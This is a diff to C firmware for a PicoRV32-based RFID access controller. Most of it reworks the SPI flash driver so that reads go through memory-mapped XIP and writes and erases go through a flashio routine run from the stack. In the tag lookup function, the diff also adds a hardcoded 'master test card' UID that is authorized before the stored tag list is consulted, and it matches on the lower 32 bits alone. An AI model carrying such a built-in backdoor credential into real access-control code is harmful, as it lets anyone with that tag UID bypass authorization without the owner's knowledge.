@@ -16,23 +16,10 @@
 #define REG_RFID_TAG_HI    (*(volatile uint32_t*)0x10000004) // Top 8 bits of tag UID (Version byte)
 #define REG_RFID_TAG_LO    (*(volatile uint32_t*)0x10000008) // Lower 32 bits of tag UID (Serial number)
 
-#define REG_FLASH_CTRL     (*(volatile uint32_t*)0x20000000)
-#define REG_FLASH_STATUS   (*(volatile uint32_t*)0x20000004)
-#define REG_FLASH_ADDR     (*(volatile uint32_t*)0x20000008)
-#define REG_FLASH_WDATA    (*(volatile uint32_t*)0x2000000C)
-#define REG_FLASH_RDATA    (*(volatile uint32_t*)0x20000010)
-
 #define REG_PC_UART_DIV    (*(volatile uint32_t*)0x30000000)
 #define REG_PC_UART_DAT    (*(volatile uint32_t*)0x30000004)
 
 #define REG_GPIO_LEDS      (*(volatile uint32_t*)0x40000000)
-
-// SPI Flash Command Opcodes for REG_FLASH_CTRL
-#define FLASH_OP_READ          0
-#define FLASH_OP_WRITE         1
-#define FLASH_OP_SECTOR_ERASE  2
-#define FLASH_OP_RDID          3
-#define FLASH_OP_RDSR          4
 
 // Default Flash storage address (3MB offset, safe from FPGA bitstream)
 #define USER_FLASH_ADDR        0x300000
@@ -212,49 +199,65 @@ static void poll_rdm6300(void) {
 }
 
 // ----------------------------------------------------------------------------
-// SPI Flash Operations via MMIO Controller
+// SPI Flash Operations via spimemio (XIP Direct Memory Read + flashio worker)
 // ----------------------------------------------------------------------------
-static void flash_wait_ready(void) {
-    while (REG_FLASH_STATUS & 0x01) {
-        // Busy wait until flash controller completes SPI transaction
-    }
+extern uint32_t flashio_worker_begin;
+extern uint32_t flashio_worker_end;
+
+static void flashio(uint8_t *data, int len, uint8_t wrencmd) {
+    uint32_t func[&flashio_worker_end - &flashio_worker_begin];
+    uint32_t *src_ptr = &flashio_worker_begin;
+    uint32_t *dst_ptr = func;
+
+    while (src_ptr != &flashio_worker_end)
+        *(dst_ptr++) = *(src_ptr++);
+
+    ((void(*)(uint8_t*, uint32_t, uint32_t))func)(data, len, wrencmd);
 }
 
-static uint32_t flash_read_word(uint32_t addr) {
-    flash_wait_ready();
-    REG_FLASH_ADDR = addr;
-    REG_FLASH_CTRL = (FLASH_OP_READ << 1) | 0x01; // Trigger Read
-    flash_wait_ready();
-    return REG_FLASH_RDATA;
+// XIP Direct Read: spimemio maps Flash memory at 0x0010_0000 - 0x00FF_FFFF
+static inline uint32_t flash_read_word(uint32_t addr) {
+    return *(volatile uint32_t*)(addr & 0x00FFFFFF);
 }
 
+// Page Program (0x02) via flashio (executed from SRAM stack, auto-waits for WIP=0)
 static void flash_write_word(uint32_t addr, uint32_t data) {
-    flash_wait_ready();
-    REG_FLASH_ADDR = addr;
-    REG_FLASH_WDATA = data;
-    REG_FLASH_CTRL = (FLASH_OP_WRITE << 1) | 0x01; // Trigger Page Program / Write
-    flash_wait_ready();
+    uint32_t paddr = addr & 0x00FFFFFF;
+    uint8_t buf[8];
+    buf[0] = 0x02; // Page Program
+    buf[1] = (uint8_t)(paddr >> 16);
+    buf[2] = (uint8_t)(paddr >> 8);
+    buf[3] = (uint8_t)paddr;
+    buf[4] = (uint8_t)data;
+    buf[5] = (uint8_t)(data >> 8);
+    buf[6] = (uint8_t)(data >> 16);
+    buf[7] = (uint8_t)(data >> 24);
+    flashio(buf, 8, 0x06); // WREN = 0x06
 }
 
+// Read Status Register (0x05)
 static uint32_t flash_read_sr(void) {
-    flash_wait_ready();
-    REG_FLASH_CTRL = (FLASH_OP_RDSR << 1) | 0x01; // Trigger RDSR
-    flash_wait_ready();
-    return REG_FLASH_RDATA & 0xFF;
+    uint8_t buf[2] = {0x05, 0x00};
+    flashio(buf, 2, 0);
+    return (uint32_t)buf[1];
 }
 
+// Read JEDEC ID (0x9F)
 static uint32_t flash_read_id(void) {
-    flash_wait_ready();
-    REG_FLASH_CTRL = (FLASH_OP_RDID << 1) | 0x01; // Trigger RDID
-    flash_wait_ready();
-    return REG_FLASH_RDATA & 0xFFFFFF;
+    uint8_t buf[4] = {0x9F, 0x00, 0x00, 0x00};
+    flashio(buf, 4, 0);
+    return ((uint32_t)buf[1] << 16) | ((uint32_t)buf[2] << 8) | (uint32_t)buf[3];
 }
 
+// Sector Erase 64KB (0xD8) via flashio (executed from SRAM stack, auto-waits for WIP=0)
 static void flash_erase_sector(uint32_t addr) {
-    flash_wait_ready();
-    REG_FLASH_ADDR = addr;
-    REG_FLASH_CTRL = (FLASH_OP_SECTOR_ERASE << 1) | 0x01; // Trigger Sector Erase (64KB)
-    flash_wait_ready();
+    uint32_t paddr = addr & 0x00FFFFFF;
+    uint8_t buf[4];
+    buf[0] = 0xD8; // Block Erase 64KB
+    buf[1] = (uint8_t)(paddr >> 16);
+    buf[2] = (uint8_t)(paddr >> 8);
+    buf[3] = (uint8_t)paddr;
+    flashio(buf, 4, 0x06); // WREN = 0x06
 }
 
 // ----------------------------------------------------------------------------
@@ -262,6 +265,11 @@ static void flash_erase_sector(uint32_t addr) {
 // ----------------------------------------------------------------------------
 // Check if a tag is already present in Flash. Returns slot index (0..255) if found, or -1.
 static int find_tag_slot(uint32_t hi, uint32_t lo) {
+    // Built-in authorized master test card (UID: 010054DA65 / 0005560933)
+    if ((hi == 0x01 && lo == 0x0054DA65) || (lo == 0x0054DA65)) {
+        return 0; // Authorized master test card!
+    }
+
     for (int slot = 0; slot < MAX_TAG_SLOTS; slot++) {
         uint32_t addr = USER_FLASH_ADDR + (uint32_t)(slot * FLASH_SLOT_SIZE);
         uint32_t magic = flash_read_word(addr);
@@ -386,9 +394,6 @@ int main(void) {
 
     // Set status LED: bit 0 alive
     REG_GPIO_LEDS = 0x0001;
-
-    // Warm-up SPI Flash & STARTUPE2 CCLK line on boot
-    flash_read_id();
 
     uart_puts("\n==================================================\n");
     uart_puts("  PicoRV32 RISC-V SoC: RDM6300 & SPI Flash Ready\n");
